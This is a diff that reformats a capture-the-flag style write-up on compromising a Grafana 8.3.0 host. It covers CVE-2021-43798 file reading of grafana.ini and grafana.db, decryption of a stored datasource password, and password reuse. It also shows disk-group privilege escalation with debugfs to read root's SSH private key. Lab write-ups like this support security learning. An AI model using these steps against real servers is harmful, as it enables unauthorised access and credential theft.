@@ -47,7 +47,7 @@ And on port 9090 there is a prometheus instance running,which doesn't seem to be
 
 After googling for vulnerabilities in grafana v8.3.0 there is an exploit db link for a directory traversal and Arbitrary File Read
 
-https://www.exploit-db.com/exploits/50581
+[https://www.exploit-db.com/exploits/50581](https://www.exploit-db.com/exploits/50581)
 
 Using the python script it was possible to read the `/etc/grafana/grafana.ini` configuration file.
 
@@ -66,7 +66,7 @@ After checking the configuration file there are credentials for the admin.
 
 After trying those credentials, they turned out invalid. These credentials are default credentials for grafana.
 
-After searching for exploits in github, i stumbled upon https://github.com/jas502n/Grafana-CVE-2021-43798 where it is mentioned that we can query for the grafana database ( i.e /var/lib/grafana/grafana.db )
+After searching for exploits in github, i stumbled upon [https://github.com/jas502n/Grafana-CVE-2021-43798](https://github.com/jas502n/Grafana-CVE-2021-43798] where it is mentioned that we can query for the grafana database ( i.e /var/lib/grafana/grafana.db )
 
 So using curl download the grafana.db file
 
@@ -87,11 +87,11 @@ In the grafana configuration file ( i.e /etc/grafana/grafana.ini )
 
 - The secret key in the configuration file is
 
-`SW2YcwTIb9zpOOhoPsMm`
+    `SW2YcwTIb9zpOOhoPsMm`
 
 - Now decrypt the data source password using the script below:
 
-https://github.com/jas502n/Grafana-CVE-2021-43798/blob/main/AESDecrypt.go
+[https://github.com/jas502n/Grafana-CVE-2021-43798/blob/main/AESDecrypt.go](https://github.com/jas502n/Grafana-CVE-2021-43798/blob/main/AESDecrypt.go)
 
 > Note: At the time of decrypting don't forget to change the secret key and DataSourcePassword which you gathered in your enumeration phase
 
@@ -104,13 +104,12 @@ Now run the go file to decrypt
 
 `go run <file-name>`
 
-<code style="background:black">
-┌──(kali㉿kali)-[~]
+<div class="language-bash"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
 └─$  go run decrypt.go
 [*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
 [*] DataSourcePassword= YUVmMzI1V2tnnPyo8o9LU3AFB/eWCSHdwwrOSyzEuj8u8dInddOHifuDUg==
 [*] plainText= SuperSecureP@ssw0rd
-</code>
+</code></pre></div></div>
 
 - Since the user inside the datasource is sysadmin and we have the decrypted password now, let us check whether there has been reuse of password
 
@@ -120,10 +119,8 @@ Now run the go file to decrypt
 
 - As an initial step, let us find out the user and group names of the user
 
-<code style="background:black">
-$ id
-uid=1002(sysadmin) gid=1002(sysadmin) groups=1002(sysadmin),6(disk)
-</code>
+<code style="background:black">$ id
+uid=1002(sysadmin) gid=1002(sysadmin) groups=1002(sysadmin),6(disk)</code>
 
 - We notice the disk group, Let us try privilege escalation throgh disk group
 
@@ -132,8 +129,7 @@ uid=1002(sysadmin) gid=1002(sysadmin) groups=1002(sysadmin),6(disk)
 - We exploit the disk group privileges to read root user’s private SSH key
 
 
-<div class="language-bash"><div class="highlight"><pre class="highlight"><code>
-$ df -h
+<div class="language-bash"><div class="highlight"><pre class="highlight"><code>$ df -h
 Filesystem      Size  Used Avail Use% Mounted on
 udev            1.9G     0  1.9G   0% /dev
 tmpfs           390M  1.9M  388M   1% /run
@@ -155,8 +151,7 @@ Use debugfs to read the files in the partition
 
 > DebugFS is a simple-to-use RAM-based file system specially designed for debugging purposes. It can be used to access files within a given partition
 
-<div class="language-bash"><div class="highlight"><pre class="highlight"><code>
-$ debugfs /dev/sda5
+<div class="language-bash"><div class="highlight"><pre class="highlight"><code>$ debugfs /dev/sda5
 debugfs:  cd /root/.ssh
 debugfs:  cat id_rsa
 </code></pre></div></div>
@@ -164,9 +159,7 @@ debugfs:  cat id_rsa
 - Since we can read the contents inside the root directory, read root private SSH key
 - After obtaining the root private SSH key, we’ll login to the system via SSH as root
 
-<code style="background:black">
-ssh -i id_rsa root@localhost
-</code
+<code style="background:black">ssh -i id_rsa root@localhost</code>
 
 ### References
 
